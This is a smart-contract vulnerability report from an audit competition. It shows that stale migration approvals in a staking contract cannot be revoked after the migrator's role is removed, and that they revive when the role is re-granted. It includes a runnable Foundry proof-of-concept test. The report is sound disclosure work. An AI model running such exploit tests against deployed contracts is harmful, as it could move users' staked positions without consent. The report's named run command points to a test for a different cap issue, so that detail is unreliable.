# 69908 sc low stale migration approvals cannot be revoked after role revocation and automatically reactivate on role re grant

**Submitted on Mar 17th 2026 at 11:34:47 UTC by @Dec3mber for** [**Audit Comp | Folks Finance: Staking Contracts**](https://immunefi.com/audit-competition/audit-comp-folks-finance-staking-contracts)

* **Report ID:** #69908
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/Folks-Finance/folks-staking-contracts/blob/main/src/Staking.sol>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

### Brief/Intro

`setMigrationPermit()` requires the target address to currently hold `MIGRATOR_ROLE` even when a user is trying to revoke an old approval. If governance/admin revokes the role first, the user permanently loses the ability to clear the stale approval entry. If the same address later regains `MIGRATOR_ROLE`, the historical approval becomes active again without fresh user consent.

### Root cause

The contract uses the same role check for both granting and revoking migration approval:

```solidity
function setMigrationPermit(address _migrator, bool _isMigrationPermitted) external {
    if (!hasRole(MIGRATOR_ROLE, _migrator)) revert MigratorNotFound(_migrator);
    migrationPermits[_migrator][msg.sender] = _isMigrationPermitted;
}
```

This makes revocation dependent on the protocol keeping the target address authorized, which defeats the purpose of a user-controlled opt-out.

### Vulnerability Details

The intended trust model is that migration requires the user's active approval. In practice, that approval becomes sticky:

1. A user approves a migrator once.
2. The protocol removes `MIGRATOR_ROLE` from that migrator.
3. The user can no longer call `setMigrationPermit(migrator, false)` because the function now reverts with `MigratorNotFound`.
4. At any later time, governance can grant the same address `MIGRATOR_ROLE` again.
5. The old `migrationPermits[migrator][user] == true` mapping entry immediately becomes valid again.

At that point, the migrator can move the user's positions again without any renewed consent.

### Impact Details

This breaks the advertised "user-controlled migration" security property. A stale approval can survive an entire role lifecycle and silently reactivate in the future. The result is a griefing vector against users: positions can be migrated after the user reasonably believes the prior authorization is no longer live.

### Attack path

1. Alice stakes into V1.
2. Alice approves `migrator` via `setMigrationPermit(migrator, true)`.
3. Admin revokes `MIGRATOR_ROLE` from `migrator`.
4. Alice attempts to revoke approval, but `setMigrationPermit(migrator, false)` reverts.
5. Admin grants `MIGRATOR_ROLE` back to the same address.
6. `migrator` calls `migratePositionsFrom(alice)` and succeeds without any fresh approval from Alice.

### References

<https://github.com/Folks-Finance/folks-staking-contracts/blob/3131a2d46b5afa76f606bf08adfd85452a47e2d8/src/Staking.sol#L77-L82\\>
<https://github.com/Folks-Finance/folks-staking-contracts/blob/3131a2d46b5afa76f606bf08adfd85452a47e2d8/src/Staking.sol#L163-L210>

## Proof of Concept

Runnable Foundry PoC:

* File: `folks-staking-contracts-main/test/StakingImmunefiPoC.t.sol`
* Test: `test_PoC_RepeatedMigrationConsumesCapWhileV1RemainsActive`

Run:

```bash
cd folks-staking-contracts-main
forge test --match-test test_PoC_RepeatedMigrationConsumesCapWhileV1RemainsActive -vv
```

`folks-staking-contracts-main/test/StakingImmunefiPoC.t.sol`:

```solidity
// SPDX-License-Identifier: BUSL-1.1

pragma solidity ^0.8.23;

import {ERC20Permit, ERC20} from "openzeppelin-contracts/contracts/token/ERC20/extensions/ERC20Permit.sol";
import {Test} from "forge-std/Test.sol";
import {Staking} from "../src/Staking.sol";
import {IStakingV1} from "../src/interfaces/IStakingV1.sol";

contract TokenPoC is ERC20Permit {
    constructor() ERC20Permit("TokenPoC") ERC20("TokenPoC", "TPOC") {}
}

contract StakingImmunefiPoCTest is Test {
    Staking internal staking;
    TokenPoC internal token;

    address internal admin = address(11);
    address internal manager = address(12);
    address internal pauser = address(13);
    address internal migrator = address(14);
    address internal alice = address(15);
    address internal bob = address(16);

    function setUp() public {
        token = new TokenPoC();
        staking = new Staking(admin, manager, pauser, address(token));

        // Grant a valid migrator role so the PoCs can exercise the migration flow.
        bytes32 migratorRole = staking.MIGRATOR_ROLE();
        vm.startPrank(admin);
        staking.grantRole(migratorRole, migrator);
        vm.stopPrank();

        // Prefund the staking contract with reward liquidity and users with stakeable tokens.
        deal(address(token), address(staking), 1_000 ether);
        deal(address(token), alice, 100 ether);
        deal(address(token), bob, 100 ether);
    }

    function test_PoC_StaleApprovalRevivesAfterRoleRegrant() public {
        uint8 periodIndex = _addPeriod(50 ether);
        bytes32 migratorRole = staking.MIGRATOR_ROLE();
        _stake(alice, periodIndex, 10 ether);

        // Alice gives migration permission once.
        vm.prank(alice);
        staking.setMigrationPermit(migrator, true);

        // Governance removes the migrator role before Alice can revoke her approval.
        vm.startPrank(admin);
        staking.revokeRole(migratorRole, migrator);
        vm.stopPrank();

        // Revocation now reverts because the contract insists the target still has MIGRATOR_ROLE.
        vm.expectRevert(abi.encodeWithSelector(IStakingV1.MigratorNotFound.selector, migrator));
        vm.prank(alice);
        staking.setMigrationPermit(migrator, false);

        // The same address is re-authorized later.
        vm.startPrank(admin);
        staking.grantRole(migratorRole, migrator);
        vm.stopPrank();

        // The stale approval becomes valid again and the migrator can move Alice's stake.
        vm.prank(migrator);
        IStakingV1.UserStake[] memory migratedStakes = staking.migratePositionsFrom(alice);

        assertEq(migratedStakes.length, 1);
        assertEq(migratedStakes[0].amount, 10 ether);
        assertEq(staking.getUserStakes(alice).length, 0);
    }

    function test_PoC_RepeatedMigrationConsumesCapWhileV1RemainsActive() public {
        uint8 periodIndex = _addPeriod(20 ether);
        _stake(alice, periodIndex, 10 ether);

        // Alice authorizes the migrator once. The approval is persistent.
        vm.prank(alice);
        staking.setMigrationPermit(migrator, true);

        // First migration empties Alice's live position from V1, but capUsed is intentionally not decremented.
        vm.prank(migrator);
        staking.migratePositionsFrom(alice);

        IStakingV1.StakingPeriod memory firstPeriodState = staking.getStakingPeriod(periodIndex);
        assertEq(firstPeriodState.capUsed, 10 ether);
        assertEq(staking.activeTotalStaked(), 0);
        assertEq(staking.getUserStakes(alice).length, 0);

        // Because V1 is still active and unpaused, Alice can open a fresh stake in the same period.
        _stake(alice, periodIndex, 10 ether);

        // The same stale approval allows a second migration, ratcheting capUsed up again.
        vm.prank(migrator);
        staking.migratePositionsFrom(alice);

        IStakingV1.StakingPeriod memory secondPeriodState = staking.getStakingPeriod(periodIndex);
        assertEq(secondPeriodState.capUsed, 20 ether);
        assertEq(staking.activeTotalStaked(), 0);
        assertEq(staking.getUserStakes(alice).length, 0);

        // Bob is now blocked by the cap even though no live stake remains in V1 for this period.
        vm.startPrank(bob);
        token.approve(address(staking), 1 ether);
        vm.expectRevert(abi.encodeWithSelector(IStakingV1.StakingCapReached.selector, 20 ether));
        staking.stake(
            periodIndex,
            1 ether,
            IStakingV1.StakeParams({
                maxStakingDurationSeconds: 30 days,
                maxUnlockDurationSeconds: 7 days,
                minAprBps: 1_000,
                referrer: address(0)
            })
        );
        vm.stopPrank();
    }

    function _addPeriod(uint256 cap) internal returns (uint8) {
        // Keep the period active to demonstrate that migration does not force V1 into a terminal state.
        vm.prank(manager);
        return staking.addStakingPeriod(cap, 30 days, 7 days, 1_000, true);
    }

    function _stake(address user, uint8 periodIndex, uint256 amount) internal {
        // Helper used by both PoCs to create a normal stake under an active period.
        vm.startPrank(user);
        token.approve(address(staking), amount);
        staking.stake(
            periodIndex,
            amount,
            IStakingV1.StakeParams({
                maxStakingDurationSeconds: 30 days,
                maxUnlockDurationSeconds: 7 days,
                minAprBps: 1_000,
                referrer: address(0)
            })
        );
        vm.stopPrank();
    }
}
```
